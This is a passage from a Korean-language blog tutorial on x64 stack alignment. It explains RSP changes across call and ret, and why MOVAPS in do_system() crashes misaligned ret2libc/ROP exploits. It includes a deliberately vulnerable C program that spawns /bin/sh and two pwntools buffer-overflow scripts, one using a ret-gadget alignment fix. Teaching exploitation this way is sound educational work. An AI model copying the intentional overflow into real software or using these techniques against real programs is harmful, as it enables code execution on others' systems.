&#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// test.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello stack alignment\\n&quot;</span>);}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{hello();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><pre><code class="hljs bash">$ gcc -o <span class="hljs-built_in">test</span> test.c -no-pie$ gdb -q <span class="hljs-built_in">test</span></code></pre><p>&#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC81C;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xB514;&#xBC84;&#xAE45;&#xD560; &#xB54C; &#xAC70;&#xC2AC;&#xB9AC;&#xB2C8; PIE&#xB294; &#xD574;&#xC81C;&#xD558;&#xACE0; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xC138;&#xC694;. &#xC800;&#xB294; Ubuntu 20.04&#xC640; glibc-2.31&#xB97C; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/7.png" alt></p><pre><code class="hljs bash">pwndbg&gt; bp main</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/8.png" alt></p><pre><code class="hljs bash">pwndbg&gt; r</code></pre><p>&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB41C; <code>main()</code> &#xD568;&#xC218;&#xC758; entry point&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xC9C1; &#xD504;&#xB864;&#xB85C;&#xADF8;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC804;&#xC774;&#xB2C8; RSP+8&#xC740; 16&#xC758; &#xBC30;&#xC218;&#xACA0;&#xC8E0;?</p><p>RSP : <code>0x7fffffffe038</code></p><p>RSP+8 : <code>0x7fffffffe040</code></p><p>&#xC704; &#xC2A4;&#xD06C;&#xB9B0;&#xC0F7;&#xC744; &#xBCF4;&#xBA74; RSP+8&#xC740; <code>0x7fffffffe040</code>&#xC774;&#xBBC0;&#xB85C; 16&#xC758; &#xBC30;&#xC218;&#xAC00; &#xB9DE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/9.png" alt></p><p>&#xADF8;&#xB7FC; &#xB2E4;&#xB4E4; &#xC54C;&#xB2E4;&#xC2DC;&#xD53C; call &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC73C;&#xB85C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; stack&#xC5D0; return address&#xB97C; push &#xD558;&#xB2C8;&#xAE4C; call &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC9C1;&#xC804;&#xC5D4; RSP&#xAC00; 16&#xC758; &#xBC30;&#xC218;&#xACA0;&#xC8E0;?</p><p>RSP : <code>0x7fffffffe030</code></p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/10.png" alt></p><p>&#xADF8;&#xB9AC;&#xACE0; &#xD568;&#xC218; &#xD504;&#xB864;&#xB85C;&#xADF8;&#xC5D0;&#xC11C; <code>push rbp</code>&#xB97C; &#xD558;&#xB2C8;&#xAE4C; rbp&#xB294; &#xD56D;&#xC0C1; 16&#xC758; &#xBC30;&#xC218;&#xACA0;&#xB124;&#xC694;?</p><p>RSP : <code>0x7ffffffffdfe0</code></p><p>&#xB300;&#xCDA9; &#xC815;&#xB9AC;&#xD574;&#xBCF4;&#xBA74; stack align&#xC744; &#xC9C0;&#xD0A4;&#xBA74;&#xC11C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xD750;&#xB984;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>call &#xC2E4;&#xD589; &#xC9C1;&#xC804; RSP&#xB294; 16&#xC758; &#xBC30;&#xC218; ( stack align O )</li><li>&#xD568;&#xC218;&#xC758; entry point&#xC5D0;&#xC120; RSP+8&#xC774; 16&#xC758; &#xBC30;&#xC218; ( stack align X )</li><li>&#xD568;&#xC218;&#xC758; &#xD504;&#xB864;&#xB85C;&#xADF8; &#xC2E4;&#xD589; &#xD6C4; RSP&#xB294; 16&#xC758; &#xBC30;&#xC218; ( stack align O )</li><li>RBP&#xB294; &#xD56D;&#xC0C1; 16&#xC758; &#xBC30;&#xC218; ( stack align O )</li></ol><p>&#xC0AC;&#xC2E4;, &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xB54C; 2&#xBC88; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC7A0;&#xC2DC; stack align&#xC774; &#xAE68;&#xC9C0;&#xACE0; 3&#xBC88;&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; stack align&#xC774; &#xB9DE;&#xCDB0;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; 2&#xBC88;&#xB9CC; &#xB611; &#xB5BC;&#xC11C; &#x201C;&#xC774; &#xAC83;&#xB9CC; &#xC9C0;&#xD0A4;&#xC2DC;&#xBA74; stack align&#xC785;&#xB2C8;&#xB2E4;.&#x201D;&#xB77C;&#xACE0; &#xC124;&#xBA85;&#xC744; &#xC368;&#xB194;&#xC11C; &#xD5F7;&#xAC08;&#xB9AC;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;. &#xC774;&#xB798;&#xB3C4; &#xC774;&#xD574; &#xC548; &#xB418;&#xC2DC;&#xBA74; 4&#xBC88;&#xB9CC; &#xAE30;&#xC5B5;&#xD558;&#xC138;&#xC694;. 4&#xBC88;&#xB9CC; &#xC2E0;&#xACBD; &#xC368;&#xC918;&#xB3C4; &#xACF5;&#xACA9; &#xCF54;&#xB4DC;&#xB97C; &#xC9DC;&#xB294;&#xB370; &#xC544;&#xBB34; &#xC9C0;&#xC7A5;&#xC774; &#xC5C6;&#xC744; &#xAC81;&#xB2C8;&#xB2E4;. &#xB354; &#xC790;&#xC138;&#xD55C; &#xC124;&#xBA85;&#xC740; &#xC870;&#xAE08; &#xC774;&#xB530; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="MOVAPS"><a href="#MOVAPS" class="headerlink" title="MOVAPS"></a>MOVAPS</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/11.png" alt></p><p>&#xC774; &#xADDC;&#xCE59;&#xC744; &#xAF2D; &#xC9C0;&#xCF1C;&#xC57C; &#xD558;&#xB294;&#xAC00;? &#xBB3C;&#xB860; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xBC29;&#xAE08; &#xC804;&#xC5D0;&#xB3C4; &#xC124;&#xBA85;&#xD588;&#xB4EF;&#xC774; &#xC720;&#xC5F0;&#xD558;&#xAC8C; &#xC5B4;&#xACBC;&#xB2E4;&#xAC00; &#xC9C0;&#xCF30;&#xB2E4;&#xAC00; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; stack alignment&#xB294; &#xD6A8;&#xC728;&#xC744; &#xB192;&#xC774;&#xAE30; &#xC704;&#xD574; &#xC720;&#xC9C0;&#xD55C;&#xB2E4;&#xACE0;&#xB3C4; &#xC124;&#xBA85;&#xD588;&#xB2E4;&#xC2DC;&#xD53C; &#xC9C0;&#xD0A4;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xB370; &#xC544;&#xBB34; &#xBB38;&#xC81C;&#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xD6A8;&#xC728;&#xC774; &#xC880; &#xB5A8;&#xC5B4;&#xC9C8; &#xBFD0;&#x2026; &#xBB3C;&#xB860; &#xC608;&#xC678;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370; &#xBA87;&#xBA87; intel/AMD cpu&#xC5D0;&#xC11C; SSE instruction&#xC744; &#xC2E4;&#xD589;&#xD560; &#xB54C;  stack alignment&#xAC00; &#xAE68;&#xC838;&#xC788;&#xC73C;&#xBA74; segmentation fault&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/12.png" alt></p><p>&#xADF8;&#xB9AC;&#xACE0; <a href="http://qcd.phys.cmu.edu/QCDcluster/intel/vtune/reference/vc181.htm">MOVAPS</a>&#xAC00; &#xBC14;&#xB85C; SSE intruction &#xC911; &#xD558;&#xB098;&#xC785;&#xB2C8;&#xB2E4;. XMM &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB07C;&#xB9AC; &#xD639;&#xC740; XMM &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC640; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC774;&#xC5D0;&#xC11C; double quadword( 16byte ) &#xD06C;&#xAE30;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC62E;&#xAE30;&#xB294; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC778;&#xB370;, &#xBA54;&#xBAA8;&#xB9AC;&#xC758; align &#xC5EC;&#xBD80;&#xB97C; &#xAC15;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">&lt;do_system+<span class="hljs-number">364</span>&gt; movaps xmmword ptr [rsp + <span class="hljs-number">0x50</span>], xmm0</code></pre><p>XMM &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC640; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC774;&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC62E;&#xAE38; &#xB54C;, &#xBA54;&#xBAA8;&#xB9AC;&#xC758; align&#xC774; &#xAE68;&#xC838;&#xC788;&#xC73C;&#xBA74; general protection( #GP / SIGSEGV ) fault&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; Ubuntu 18.04&#xBD80;&#xD130; &#xC774; movaps &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC774; <code>do_system()</code>&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xC5EC;&#xB7EC; &#xBA40;&#xD2F0;&#xBBF8;&#xB514;&#xC5B4; &#xC624;&#xD37C;&#xB808;&#xC774;&#xC158;&#xC5D0; &#xCD94;&#xAC00;&#xB418;&#xC5B4; exploit&#xC744; &#xC791;&#xC131;&#xD560; &#xB54C; stack alignment&#xB97C; &#xC2E0;&#xACBD; &#xC368;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="JMP-vs-CALL-vs-RET"><a href="#JMP-vs-CALL-vs-RET" class="headerlink" title="JMP vs CALL vs RET"></a>JMP vs CALL vs RET</h1><p>&#xADF8;&#xB798;&#xC11C; Exploit&#xC774;&#xB791; stack align&#xC774; &#xAE68;&#xC9C0;&#xB294; &#xAC70;&#xB791; &#xBB34;&#xC2A8; &#xC0C1;&#xAD00;&#xC778;&#xB370;? &#xADF8;&#xB798;&#xC11C; &#xC65C; 16.04&#xC5D0;&#xC120; &#xC258;&#xC744; &#xB744;&#xC6B0;&#xB358; &#xACF5;&#xACA9; &#xCF54;&#xB4DC;&#xAC00; 18.04&#xBD80;&#xD134; &#xC791;&#xB3D9; &#xC548; &#xD558;&#xB294; &#xAC74;&#xB370;? &#xC774;&#xAC70;&#xB97C; &#xC774;&#xD574;&#xD558;&#xB824;&#xBA74; &#xC6B0;&#xC120; control intsruction&#xB4E4;&#xC758; &#xCC28;&#xC774;&#xB97C; &#xC54C;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xBAA8;&#xB974;&#xB294; &#xC0AC;&#xB78C;&#xC774; &#xB9CE;&#xB354;&#xB77C;&#xACE0;&#x2026; &#xAC01; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xB9C8;&#xB2E4; &#xC2A4;&#xD0DD;&#xC758; &#xBCC0;&#xD654;, &#xB354; &#xC790;&#xC138;&#xD788; &#xB9D0;&#xD558;&#xC790;&#xBA74; RSP&#xC758; &#xBCC0;&#xD654;&#xAC00; &#xC5B4;&#xB5A4;&#xC9C0; &#xC54C;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="1-JMP"><a href="#1-JMP" class="headerlink" title="1. JMP"></a>1. JMP</h2><blockquote><p>Transfers program control to a different point in the instruction stream <strong>without</strong> recording <strong>return information</strong>.</p></blockquote><p>&#xB2E8;&#xC21C;&#xD788; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD750;&#xB984;&#xC744; &#xC62E;&#xAE40;. &#xC778;&#xC6A9;&#xAD6C;&#xB97C; &#xBCF4;&#xBA74; &#xC54C;&#xACA0;&#xC9C0;&#xB9CC; &#xB9AC;&#xD134; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. jmp &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xC2A4;&#xD0DD;&#xC758; &#xBCC0;&#xD654;&#xB294; &#xC5C6;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="2-CALL"><a href="#2-CALL" class="headerlink" title="2. CALL"></a>2. CALL</h2><p>&#xBC18;&#xBA74; call &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD750;&#xB984;&#xC744; &#xC62E;&#xAE30;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C; subroutine&#xC5D0; &#xC7A0;&#xC2DC; &#xB4E4;&#xB800;&#xB2E4;&#xAC00; &#xB3CC;&#xC544;&#xC624;&#xB294; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9AC;&#xD134; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xADF8; &#xB9AC;&#xD134; &#xC815;&#xBCF4;&#xB294; stack&#xC5D0; push &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; call &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD55C; &#xB4A4;&#xC5D4; RSP&#xC758; &#xAC12;&#xC774; 8&#xB9CC;&#xD07C; &#xAC10;&#xC18C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/13.png" alt></p><p>RSP : <code>0x7fffffffe030</code></p><p>call hello &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBA74; <main+18>&#xC744; stack&#xC5D0; push &#xD558;&#xACA0;&#xC8E0;?</main+18></p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/14.png" alt></p><p>RSP : <code>0x7fffffffe028</code></p><p>&#xB530;&#xB77C;&#xC11C; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB41C; &#xD568;&#xC218;&#xC758; entry point&#xC5D0;&#xC120; RSP+8&#xC774; 16&#xC758; &#xBC30;&#xC218;&#xAC00; &#xB418;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xAF2D; &#xAE30;&#xC5B5;&#xD558;&#xC154;&#xC57C; &#xD560; &#xAC83;&#xC774; Call&#xC744; &#xC2E4;&#xD589;&#xD55C; &#xC9C1;&#xD6C4;&#xC5D4; &#xC77C;&#xC2DC;&#xC801;&#xC73C;&#xB85C; stack align&#xC774; &#xAE68;&#xC9C4;&#xB2E4;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;.</p><h2 id="3-RET"><a href="#3-RET" class="headerlink" title="3. RET"></a>3. RET</h2><pre><code class="hljs c">pop ripjmp rip</code></pre><p>call&#xC744; &#xC124;&#xBA85;&#xD560; &#xB54C; sub routine&#xC5D0; &#xC7A0;&#xC2DC; &#xB4E4;&#xB800;&#xB2E4; &#xB3CC;&#xC544;&#xAC04;&#xB2E4;&#xACE0; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xC774; &#xBAA8;&#xB4E0; &#xB3D9;&#xC791;&#xC744; call&#xC774; &#xB2E4; &#xD558;&#xC9C4; &#xC54A;&#xACE0;, &#xC6D0;&#xB798;&#xC758; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158; &#xC2A4;&#xD2B8;&#xB9BC;&#xC73C;&#xB85C; &#xB2E4;&#xC2DC; &#xB3CC;&#xC544;&#xAC00;&#xB294; &#xB3D9;&#xC791;&#xC740;  ret&#xC774; &#xB300;&#xC2E0;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>ret&#xC740; &#xB450; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC744; &#xD558;&#xB098;&#xB85C; &#xD569;&#xCCD0; &#xB1A8;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB418;&#xB294;&#xB370;, call&#xC774; &#xC800;&#xC7A5;&#xD574;&#xB193;&#xC740; &#xB9AC;&#xD134; &#xC815;&#xBCF4;&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0;&#xC11C; &#xBE7C;&#xB0B4;&#xC5B4; jmp &#xD569;&#xB2C8;&#xB2E4;. &#xC989;, RSP&#xAC12;&#xC774; 8&#xB9CC;&#xD07C; &#xC99D;&#xAC00;&#xD55C;&#xB2E4;&#xB294; &#xB73B;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/15.png" alt></p><p>RSP : <code>0x7fffffffe028</code></p><p>&#xC704; &#xC2A4;&#xD06C;&#xB9B0;&#xC0F7;&#xC740; ret&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC9C1;&#xC804;&#xC758; &#xC0C1;&#xD669;&#xC785;&#xB2C8;&#xB2E4;. RSP &#xAC12;&#xC744; &#xBCF4;&#xBA74; &#xC544;&#xC2DC;&#xACA0;&#xC9C0;&#xB9CC; ret&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC9C1;&#xC804;&#xC5D4; stack align&#xC774; &#xAE68;&#xC838;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xD568;&#xC218; &#xC5D0;&#xD544;&#xB85C;&#xADF8;&#xC758; leave &#xBA85;&#xB839;&#xC5B4; &#xD639;&#xC740; pop rbp&#xC758; &#xACB0;&#xACFC;&#xACA0;&#xC8E0;?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/16.png" alt></p><p>RSP : <code>0x7fffffffe030</code></p><p>&#xADF8;&#xB9AC;&#xACE0; ret&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; RSP&#xAC00; 8&#xB9CC;&#xD07C; &#xC99D;&#xAC00;&#xD558;&#xACE0; stack align&#xC774; &#xB2E4;&#xC2DC; &#xB9DE;&#xCDB0;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h2 id="&#xC815;&#xB9AC;"><a href="#&#xC815;&#xB9AC;" class="headerlink" title="&#xC815;&#xB9AC;"></a>&#xC815;&#xB9AC;</h2><ul><li>call : RSP-=8 &#x2192; &#xC77C;&#xC2DC;&#xC801;&#xC73C;&#xB85C; stack align&#xC744; &#xAE78;</li><li>ret : RSP+=8 &#x2192; leave &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xAE68;&#xC9C4; stack align&#xC744; &#xB2E4;&#xC2DC; &#xB9DE;&#xCDA4;</li></ul><h1 id="Abnormal-call"><a href="#Abnormal-call" class="headerlink" title="Abnormal call"></a>Abnormal call</h1><p>&#xC790; &#xC774;&#xCBE4; &#xB418;&#xBA74; &#xB300;&#xCDA9; &#xB208;&#xCE58;&#xCC44;&#xC168;&#xC744; &#xAC70; &#xAC19;&#xC740;&#xB370;, BOF&#xACF5;&#xACA9;&#xC744; &#xD560; &#xB54C; ret&#xC73C;&#xB85C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC8E0;? shellcode&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC74; &#xB17C;&#xC678;&#xB85C; &#xCE58;&#xACE0;, ret2libc( RTL )&#xB098; ROP&#xB85C; BOF exploit&#xC744; &#xD558;&#xAC8C; &#xB420; &#xD150;&#xB370; call&#xC774; &#xC544;&#xB2C8;&#xB77C; ret&#xC73C;&#xB85C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; stack alignment&#xAC00; &#xAE68;&#xC9C0;&#xAC8C; &#xB418;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;.</p><h2 id="vuln-c"><a href="#vuln-c" class="headerlink" title="vuln.c"></a>vuln.c</h2><pre><code class="hljs c"><span class="hljs-comment">// vuln.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">win</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{<span class="hljs-keyword">char</span> buf[<span class="hljs-number">16</span>];read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">128</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}$ gcc -o vuln vuln.c -no-pie -fno-<span class="hljs-built_in">stack</span>-protector</code></pre><p>&#xC815;&#xB9D0; &#xAC04;&#xB2E8;&#xD55C; BOF &#xC608;&#xC81C;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xC8E0;. vuln.c&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0; &#xCEF4;&#xD30C;&#xC77C;&#xD574;&#xC90D;&#xC2DC;&#xB2E4;. BOF&#xB97C; &#xD560; &#xAC70;&#xB2C8;&#xAE4C; &#xB2F9;&#xC5F0;&#xD788; stack canary&#xB294; &#xD574;&#xC81C;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><h2 id="bof-py"><a href="#bof-py" class="headerlink" title="bof.py"></a>bof.py</h2><pre><code class="hljs python"><span class="hljs-comment"># bof.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&apos;./vuln&apos;</span>)gdb.attach(p)win = <span class="hljs-number">0x401156</span>payload = <span class="hljs-string">b&apos;A&apos;</span>*<span class="hljs-number">24</span> + p64(win)p.sendline(payload)p.interactive()$ python3 bof.py</code></pre><p><code>main()</code>&#xC758; return &#xC8FC;&#xC18C;&#xB97C; <code>win()</code> &#xD568;&#xC218;&#xC758; entry point&#xB85C; &#xB36E;&#xC5B4;&#xC4F0;&#xB294; &#xACF5;&#xACA9; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/17.png" alt></p><pre><code class="hljs bash">pwndbg&gt; bp main+45pwndbg&gt; c</code></pre><p><code>main()</code>&#xC758; ret&#xC5D0; break point&#xB97C; &#xAC78;&#xACE0; <code>win()</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB41C; &#xD6C4;&#xC758; stack &#xC0C1;&#xD669;&#xC744; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/18.png" alt></p><pre><code class="hljs bash">pwndbg&gt; ni</code></pre><p>ret&#xC73C;&#xB85C; &#xD568;&#xC218; <code>win()</code>&#xC758; entry point&#xC5D0; &#xB3C4;&#xB2EC;&#xD574;&#xC11C; &#xD504;&#xB864;&#xB85C;&#xADF8;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xB098;&#xBA74; stack alignment&#xAC00; &#xAE68;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/19.png" alt></p><p>&#xCEF4;&#xD4E8;&#xD130;&#xB294; stack&#xC774; &#xD56D;&#xC0C1; align &#xB3FC;&#xC788;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD558;&#xACE0; &#xADF8; &#xC0C1;&#xD0DC;&#xB97C; &#xC720;&#xC9C0;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC989;, <code>win()</code>&#xC5D0;&#xC11C; &#xAE68;&#xC838;&#xBC84;&#xB9B0; alignment&#xB97C; &#xAE68;&#xC9C4; &#xC0C1;&#xD0DC;&#xB85C; &#xC720;&#xC9C0;&#xD558;&#xAC8C; &#xB418;&#xACE0;, <code>win()</code> &#xC774;&#xD6C4;&#xC5D0; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xD568;&#xC218;&#xB4E4;&#xC758; stack alignment&#xB294; &#xAE68;&#xC9C4; &#xC0C1;&#xD0DC;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/20.png" alt></p><p>&#xADF8;&#xB9AC;&#xACE0; &#xACB0;&#xAD6D; <code>do_system()</code>&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB2E4; movaps&#xC5D0; &#xAC78;&#xB824; segmentation fault&#xB97C; &#xB744;&#xC6B0;&#xACE0; exploit&#xC740; &#xC2E4;&#xD328;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="RET-sled"><a href="#RET-sled" class="headerlink" title="RET sled"></a>RET sled</h1><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xC124;&#xBA85;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xC774;&#xD574;&#xD558;&#xC168;&#xB2E4;&#xBA74; &#xC55E;&#xC73C;&#xB85C; &#xACF5;&#xACA9; &#xCF54;&#xB4DC;&#xB97C; &#xC9DC;&#xC2E4; &#xB54C; &#xC544;&#xBB34; &#xBB38;&#xC81C;&#xC5C6;&#xC744; &#xAC70;&#xB77C; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xB3C4; &#xC5EC;&#xAE30;&#xC11C; &#xAE00;&#xC744; &#xB9C8;&#xBB34;&#xB9AC; &#xC9D3;&#xAE34; &#xC560;&#xB9E4;&#xD558;&#xB2C8; &#xD574;&#xACB0; &#xBC29;&#xBC95;&#xC744; &#xC54C;&#xC544;&#xBCF4;&#xC8E0;.</p><pre><code class="hljs python"><span class="hljs-comment">#bof2.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&apos;./vuln&apos;</span>)win = <span class="hljs-number">0x401156</span>ret = <span class="hljs-number">0x40119a</span> <span class="hljs-comment"># ret sled</span>payload = <span class="hljs-string">b&apos;A&apos;</span>*<span class="hljs-number">24</span> + p64(ret) + p64(win)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/21.png" alt></p><pre><code class="hljs bash">$ python3 bof2.py</code></pre><p>&#xB124;. &#xC815;&#xB9D0; &#xBCC4;&#xAC70; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. ret &#xAC00;&#xC82F;&#xC744; &#xD558;&#xB098; &#xB354; &#xCD94;&#xAC00;&#xD574;&#xC11C; RSP&#xC758; &#xC704;&#xCE58;&#xB97C; 8&#xB9CC;&#xD07C; &#xC870;&#xC815;&#xD574;&#xC8FC;&#xBA74; BOF &#xACF5;&#xACA9;&#xC744; &#xD560; &#xB54C; stack alignment&#xB97C; &#xC720;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB108;&#xBB34; &#xB2E8;&#xC21C;&#xD558;&#xACE0; &#xB2F9;&#xC5F0;&#xD574;&#xC11C; &#xB354; &#xC124;&#xBA85;&#xD560; &#xAC8C; &#xC5C6;&#xB124;&#xC694;.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/22.png" 